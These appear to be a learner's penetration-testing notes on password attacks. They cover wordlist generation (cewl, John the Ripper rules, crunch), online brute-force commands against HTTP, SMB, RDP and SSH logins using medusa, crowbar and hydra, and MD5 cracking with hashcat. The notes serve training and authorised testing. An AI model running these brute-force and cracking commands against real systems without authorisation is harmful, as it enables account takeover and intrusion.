In general many pws under `/usr/share/worklists/`
# commond passwords available in kali
/usr/share/worklists/rockyou.txt

## unzip with
gunzip /usr/share/worklists/rockyou.txt.gz

# dictionary attack
* geneate wordlist by studying website, creates a file which contains works greater than six chars (-m6): `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
* using John the Ripper to mutate the wordlist: `sudo nano /etc/john/john.conf`
We might just add a unique rule for JTR (see adding following text in code): 
```
# Wordlist mode rules
[List.Rules:Wordlist]
# Try words as they are
:
# Lowercase every pure alphanumeric word
-c >3 !?X l Q
# Capitalize every pure alphanumeric word
-c (?a >2 !?X c Q
# Lowercase and pluralize pure alphabetic words
...
# Try the second half of split passwords
-s x_
-s-c x_ M l Q
# [Adding following:]Add two numbers to the end of each password
$[0-9]$[0-9]
```
* run to mutate the list: `john --wordlist=bigTree-cewl.txt --rules --stdout > mutated.txt` 

# Bruteforce wordlists (if you have a specific pw policy)
In contrast to a dictionary attack, a brute force password attack calculates and tests every possible
character combination that could make up a password until the correct one is found

* for example pw policy: `[Capital Letter][2 x lower case letters] [2 x special chars][3 x numeric]`
* check manual for crunch `man crunch` then we might generate random pws with: `crunch 8 8 -t ,@@^^%%%` => will exatly generate as described above
Placeholder Character Translation
```
@ => Lower case alpha characters
, => Upper case alpha characters
% => Numeric characters
^ => Special characters including space
```
* `crunch 4 6 0123456789ABCDEF -o crunch.txt` => create pws with length 4 to 6 with allowed chars "01...EF"

# Bruteforcing different protocolls
`medusa -d` to check with protocols can be bruteforced

## http baseAuth with username and pw
`medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`

## smb
`medusa -h 192.168.174.10 -u admin -P /usr/share/wordlists/rockyou.txt -M smbnt`

## rdp - Remote Desktop Protocol Attack (windows) with Crowbar
Crowbar, formally known as Levye, is a network authentication cracking tool primarily designed to
leverage SSH keys rather than passwords. It is also one of the few tools that can reliably and
efficiently perform password attacks against the Windows Remote Desktop Protocol (RDP) service
on modern versions of Windows.

To invoke crowbar , we will specify the protocol ( -b ), the target server ( -s ), a username ( -u ), a
wordlist ( -C ), and the number of threads ( -n ) => *rdp just support one thread*
`crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`

## SSH Attack with THC-Hydra
//using username “root” with a password list on ssh with 4 parallel tasks and verbose
`hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.0.13:22 -t 4 -V`
or: `hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`

## HTTP POST Attack with THC-Hydra
As an additional example, we will perform an HTTP POST attack against our Windows Apache
server using Hydra. When a HTTP POST request is used for user login, it is most often through the
use of a web form, which means we should use the “http-form-post” service module
`hydra http-form-post -U`

The complete command can now be executed. We will supply the admin user name ( `-l admin` )
and wordlist ( `-P` ), request verbose output with `-vV` , and use `-f` to stop the attack when the first
successful result is found. In addition, we will supply the service module name ( `http-form-post` )
and its required arguments ( `“/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN”` )
`hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`

# Hashes

## Identifying hashes
`hashid c43ee559d69bc7f691fe2fbfe8a5ef0a`
Generates:
Analyzing 'c43ee559d69bc7f691fe2fbfe8a5ef0a'
[+] MD2

## Decrypt hashes

Example: cracking md5 (0 => md5) -a attackmode
`hashcat -m 0 -a 0 "5f4dcc3b5aa765d61d8327deb882cf99"`

OR add `--force` run with CPU instead of GPU; 0 => md5
`hashcat -m 0 md5hash.txt /home/kali/Documents/rockyou.txt --force`